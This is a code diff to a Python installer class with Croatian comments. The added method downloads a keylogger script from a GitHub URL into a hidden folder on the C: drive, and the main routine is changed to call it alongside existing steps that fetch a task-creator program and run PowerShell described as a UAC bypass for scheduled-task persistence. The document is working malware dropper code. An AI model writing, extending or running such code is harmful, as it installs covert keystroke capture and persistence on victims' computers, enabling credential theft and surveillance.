@@ -47,6 +47,19 @@ class Inicijalizacija:
 
 ##########################################################################################################################################################################
 
+    def downloadKeylogger(self):
+        url = "https://github.com/B-nad/keylogger/raw/refs/heads/main/Keylogger.pyw" # url lokacije datoteke koja kreira task
+        response = requests.get(url)
+
+        if response.status_code == 200:
+            with open("c:\\skriveni_folder\\Keylogger.pyw", "wb") as file: # kreiranje task kreatora i upisivanje dohvaćene datoteke u njega
+                file.write(response.content)
+            print(f"File je uspješno preuzet.")
+        else:
+            print("Pogreška prilikom preuzimanja.")
+
+##########################################################################################################################################################################
+
     def createTask(self):
         powershell_script = r"""
         Param ([String]$program = '"c:\skriveni_folder\task kreator.exe"')  # Zaseban file napisan u c++ koji služi za UAC bypass prilikom kreiranja scheduled
@@ -69,5 +82,6 @@ class Inicijalizacija:
 # Kreiranje instance klase i poziv metoda
 inicijalizacija = Inicijalizacija()
 inicijalizacija.moveFile()
+inicijalizacija.downloadKeylogger()
 inicijalizacija.downloadTaskKreator()
 inicijalizacija.createTask()
